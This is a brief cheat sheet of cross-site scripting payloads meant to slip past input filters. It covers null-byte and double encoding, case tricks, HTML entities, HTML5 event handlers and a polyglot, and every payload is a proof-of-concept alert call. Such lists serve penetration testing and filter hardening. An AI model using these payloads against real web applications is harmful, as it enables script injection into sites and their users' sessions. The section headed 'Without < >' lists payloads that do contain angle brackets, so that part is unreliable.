# XSS Filter Bypass

## Null Byte
```html
<scr%00ipt>alert(1)</scr%00ipt>
<scri%00pt>alert(1)</scri%00pt>
```

## Double Encoding
```html
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

## Case Variation
```html
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
```

## Without Parentheses
```html
<img src=x onerror=alert`1`>
<svg onload=alert&#40;1&#41;>
```

## Without alert
```javascript
confirm(1)
prompt(1)
console.log(1)
print()
```

## Without < >
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

## JavaScript Entity
```html
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```

## URL Encoding
```html
%3Cscript%3Ealert(1)%3C%2Fscript%3E
%3Csvg%20onload%3Dalert(1)%3E
```

## Using HTML5 Features
```html
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=x>">
```

## Polyglot
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
```
